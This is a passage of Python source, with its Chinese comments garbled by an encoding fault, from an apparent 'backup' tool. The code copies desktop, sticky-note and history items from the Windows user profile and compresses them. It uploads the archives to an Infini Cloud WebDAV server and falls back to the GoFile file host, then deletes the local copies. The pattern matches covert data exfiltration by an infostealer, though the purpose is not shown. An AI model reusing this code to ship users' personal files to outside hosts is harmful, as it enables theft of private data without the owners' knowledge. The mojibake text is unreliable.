            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # ä»…åœ¨å…¨éƒ¨åˆ†ç‰‡ä¸Šä¼ æˆåŠŸåæ¸…ç†åˆ†ç‰‡ç›®å½•ä¸åŸå§‹æ–‡ä»¶
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # è‹¥åŸå§‹æ–‡ä»¶ä»åœ¨ï¼Œä¸Šä¼ æˆåŠŸååˆ é™¤
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆä½¿ç”¨ WebDAV MKCOL æ–¹æ³•ï¼‰"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # æ„å»ºç›®å½•è·¯å¾„
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 è¡¨ç¤ºå·²å­˜åœ¨
                return True
            elif response.status_code == 409:
                # 409 å¯èƒ½è¡¨ç¤ºçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»ºçˆ¶ç›®å½•
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # çˆ¶ç›®å½•åˆ›å»ºæˆåŠŸï¼Œå†æ¬¡å°è¯•åˆ›å»ºå½“å‰ç›®å½•
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° Infini Cloudï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # æ„å»ºè¿œç¨‹è·¯å¾„
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆå¦‚æœéœ€è¦ï¼‰
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"æ— æ³•åˆ›å»ºè¿œç¨‹ç›®å½•: {remote_dir}ï¼Œå°†ç»§ç»­å°è¯•ä¸Šä¼ ")

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # æ ¹æ®æ–‡ä»¶å¤§å°åŠ¨æ€è°ƒæ•´è¶…æ—¶æ—¶é—´
                    if file_size < 1024 * 1024:  # å°äº1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # å¤§äº10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # åªåœ¨ç¬¬ä¸€æ¬¡å°è¯•æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"ğŸ“¤ [Infini Cloud] ä¸Šä¼ : {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] é‡è¯•ä¸Šä¼ : {filename} (ç¬¬ {attempt + 1} æ¬¡)")
                    
                    # å‡†å¤‡è¯·æ±‚å¤´
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # æ‰§è¡Œä¸Šä¼ ï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"âœ… [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: æƒé™ä¸è¶³")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„ä¸å­˜åœ¨")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„å†²çª")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: çŠ¶æ€ç  {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¿æ¥é”™è¯¯")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° GoFileï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"ğŸ”„ å°è¯•ä½¿ç”¨ GoFile ä¸Šä¼ : {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"âœ… [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except (ValueError, KeyError) as e:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"[GoFile] æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®: {str(e)}")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¿æ¥é”™è¯¯")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¯·æ±‚å¼‚å¸¸")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: æ–‡ä»¶è¯»å–é”™è¯¯")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼Œä¼˜å…ˆä½¿ç”¨ Infini Cloudï¼Œå¤±è´¥åˆ™ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)
                return False

            # ä¼˜å…ˆå°è¯• Infini Cloud ä¸Šä¼ 
            if self._upload_single_file_infini(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True

            # Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
            logging.warning(f"âš ï¸ Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # ä¸¤ä¸ªæ–¹æ³•éƒ½å¤±è´¥
            logging.error(f"âŒ {os.path.basename(file_path)}: æ‰€æœ‰ä¸Šä¼ æ–¹æ³•å‡å¤±è´¥")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def backup_specified_files(self, source_dir, target_dir):
        """å¤‡ä»½æŒ‡å®šçš„é‡è¦ç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
        
        Args:
            source_dir: æºç›®å½•è·¯å¾„ï¼ˆé€šå¸¸ä¸º %USERPROFILE%ï¼‰
            target_dir: ç›®æ ‡ç›®å½•è·¯å¾„
            
        Returns:
            str: å¤‡ä»½ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› None
        """
        source_dir = os.path.abspath(os.path.expandvars(source_dir))
        target_dir = os.path.abspath(os.path.expandvars(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug("å¼€å§‹å¤‡ä»½æŒ‡å®šç›®å½•å’Œæ–‡ä»¶:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        files_count = 0
        total_size = 0

        for item in self.config.WINDOWS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # å¤åˆ¶ç›®å½•
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"åˆ›å»ºç›®æ ‡çˆ¶ç›®å½•å¤±è´¥: {parent_dir}")
                        continue
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {source_path} -> {target_path}")
                else:
                    # å¤åˆ¶æ–‡ä»¶
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"åˆ›å»ºç›®æ ‡çˆ¶ç›®å½•å¤±è´¥: {parent_dir}")
                        continue
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {str(e)}")

        if files_count > 0:
            logging.info("\nğŸ“Š æŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error("âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æŒ‡å®šæ–‡ä»¶")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
